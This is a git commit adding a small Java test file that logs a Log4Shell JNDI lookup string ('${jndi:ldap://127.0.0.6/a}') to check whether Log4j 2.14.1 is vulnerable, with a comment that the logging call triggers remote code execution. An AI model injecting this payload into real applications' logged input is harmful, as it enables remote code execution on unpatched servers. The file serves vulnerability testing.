6fbe1b6b74f0e3095559f6b3431f2e9e68f2798a
Schmitt Sebastian <sebastian.schmitt@emnify.com>
2021-12-10 14:52:23 +0100

    basic example to test log4j vulnerability
    (cherry picked from commit 2ea28c3a158aed789a91470fb750a855cc574105)

---
+++ src/main/java/VulnerableLog4jExample.java
@@ -0,0 +1,24 @@
+// Log4J 2.14.1 & confluent cp4
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+// rest
+//import org.apache.log4j.Logger;
+
+import java.io.IOException;
+
+public class VulnerableLog4jExample {
+
+  // Log4J 2.14.1 & confluent cp4
+  static Logger log = LogManager.getLogger();
+
+  // Log4J rest
+//  static Logger log = Logger.getLogger(VulnerableLog4jExampleHandler.class);
+
+  public static void main(String[] args) throws IOException {
+    String attackString = "${jndi:ldap://127.0.0.6/a}";
+    // This line triggers the RCE by logging the attackString.
+    log.info("Requesting :" + attackString);
+  }
+}
